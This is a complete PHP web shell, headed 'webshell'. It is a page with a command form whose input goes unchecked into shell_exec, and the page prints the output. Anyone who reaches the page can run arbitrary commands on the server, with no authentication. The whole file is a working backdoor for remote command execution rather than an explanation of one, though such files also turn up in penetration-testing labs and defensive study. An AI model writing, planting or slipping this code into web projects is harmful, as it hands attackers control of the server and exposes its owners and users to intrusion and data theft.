<?php
$link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
?>
<body style="background-color:rgb(200,200,200);">
    <form action="<?php echo "{$link}" ?>" method="POST">
        <center>
            <strong>
                <h2 style="color:rgb(0, 0, 0);"><b>webshell</b></h2>
                COMMAND: <input type="text" name="cmd" value=""/>
                <input type="submit" name="submit" value="CMD" />
                </br>
            </strong>
        </center>
        <br />
        <strong>
            <font size="5"> 
                <?php
                if (isset($_POST["cmd"])) {
                    $cmd = $_POST["cmd"];
                    $output = shell_exec("{$cmd} 2>&1");
                    echo $cmd . "</br><pre>" . $output . "</pre>";
                }
                ?>
            </font>
        </strong>
</body>
